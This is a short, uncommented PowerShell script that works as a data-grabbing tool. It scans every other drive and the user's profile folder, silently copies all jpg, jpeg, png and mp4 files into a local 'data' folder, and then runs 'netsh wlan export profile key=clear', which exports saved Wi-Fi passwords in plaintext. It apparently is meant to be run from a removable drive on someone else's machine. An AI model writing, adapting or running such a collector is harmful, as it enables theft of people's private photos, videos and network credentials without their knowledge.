$ec = 0
$array = @("C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z")
$fol = "data"

foreach ($element in $array) {
	$drive = $element + ":"
	if ($drive | Test-Path) {
		if ($drive -eq "C:"){
			$drive = "C:\Users\$env:UserName"
		}
		$t = (Get-Location).Drive.Name
		if (-NOT  ($element -eq $t)) {
			Add-Content "$fol\results" "Scanning $drive drive"
			Get-ChildItem $drive -Recurse -ErrorAction 'SilentlyContinue' -Include "*.jpg", "*.jpeg", "*.png", "*.mp4" | % {
				$stringa = $ec.ToString("0000000")
				$ex = $_.Extension
				try {
					Copy-Item $_.FullName -Destination "$fol\$stringa$ex"
					$ec++
					Add-Content "$fol\results" "$_, $fol\$stringa$ex"
				}
				catch {
					Add-Content "$fol\results" "Error on $_"
				}
			}
		}
	}
}

try {
   netsh wlan export profile key=clear > nul
}
catch {
    Add-Content "$fol\results" "No WLAN"
}
